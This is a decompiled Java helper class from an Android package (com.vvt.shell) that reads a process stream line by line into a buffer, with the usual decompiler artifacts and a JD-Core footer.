package com.vvt.shell;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;

class c
  extends Thread
{
  private InputStream a;
  private StringBuffer b;
  
  public c(InputStream paramInputStream)
  {
    this.a = paramInputStream;
    StringBuffer localStringBuffer = new java/lang/StringBuffer;
    localStringBuffer.<init>();
    this.b = localStringBuffer;
    start();
  }
  
  public String a()
  {
    try
    {
      join();
      return this.b.toString();
    }
    catch (InterruptedException localInterruptedException)
    {
      for (;;) {}
    }
  }
  
  public void run()
  {
    try
    {
      BufferedReader localBufferedReader = new java/io/BufferedReader;
      Object localObject1 = new java/io/InputStreamReader;
      Object localObject2 = this.a;
      ((InputStreamReader)localObject1).<init>((InputStream)localObject2);
      localBufferedReader.<init>((Reader)localObject1);
      localObject1 = localBufferedReader.readLine();
      if (localObject1 != null)
      {
        localObject2 = this.b;
        ((StringBuffer)localObject2).append((String)localObject1);
        for (;;)
        {
          localObject1 = localBufferedReader.readLine();
          if (localObject1 == null) {
            break;
          }
          localObject2 = this.b;
          String str = KMShell.b();
          localObject2 = ((StringBuffer)localObject2).append(str);
          ((StringBuffer)localObject2).append((String)localObject1);
        }
      }
      return;
    }
    catch (IOException localIOException) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/shell/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */